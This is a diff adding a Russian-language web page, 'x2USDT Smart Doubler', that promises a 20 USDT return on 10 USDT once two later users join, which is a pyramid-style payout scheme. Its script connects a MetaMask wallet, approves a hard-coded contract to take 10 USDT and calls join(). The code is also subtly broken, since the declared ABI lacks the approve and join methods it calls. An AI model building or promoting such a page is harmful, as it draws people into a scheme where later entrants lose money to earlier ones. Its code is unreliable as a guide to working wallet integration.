@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>x2USDT Doubler</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 60px;
+    }
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+      cursor: pointer;
+      background-color: #0f0;
+      color: #000;
+      border: none;
+      margin-top: 20px;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <h1>x2USDT Smart Doubler</h1>
+  <p>Отправь 10 USDT — получи 20 USDT, когда зайдут 2 человека после тебя.</p>
+  <button onclick="connectWallet()">Подключить кошелёк</button>
+  <button onclick="join()">Войти за 10 USDT</button>
+  <div id="status">Ожидание подключения...</div>
+
+  <script>
+    const contractAddress = "0x02B50B2B5048Ea2712026DD89F9B74ae21B1710f";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const abi = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transfer",
+        "outputs": [
+          { "internalType": "bool", "name": "", "type": "bool" }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          { "internalType": "address", "name": "sender", "type": "address" },
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+          { "internalType": "bool", "name": "", "type": "bool" }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
+
+    let web3;
+    let contract;
+    let account;
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          account = accounts[0];
+          contract = new web3.eth.Contract(abi, contractAddress);
+          document.getElementById("status").innerText = "Кошелёк подключен: " + account;
+        } catch (error) {
+          document.getElementById("status").innerText = "Ошибка подключения: " + error.message;
+        }
+      } else {
+        document.getElementById("status").innerText = "Установи Metamask";
+      }
+    }
+
+    async function join() {
+      const amount = web3.utils.toWei("10", "ether");
+      const usdt = new web3.eth.Contract(abi, usdtAddress);
+
+      try {
+        await usdt.methods.approve(contractAddress, amount).send({ from: account });
+        await contract.methods.join().send({ from: account });
+        document.getElementById("status").innerText = "Успешный вход!";
+      } catch (error) {
+        document.getElementById("status").innerText = "Ошибка: " + error.message;
+      }
+    }
+  </script>
+</body>
+</html>
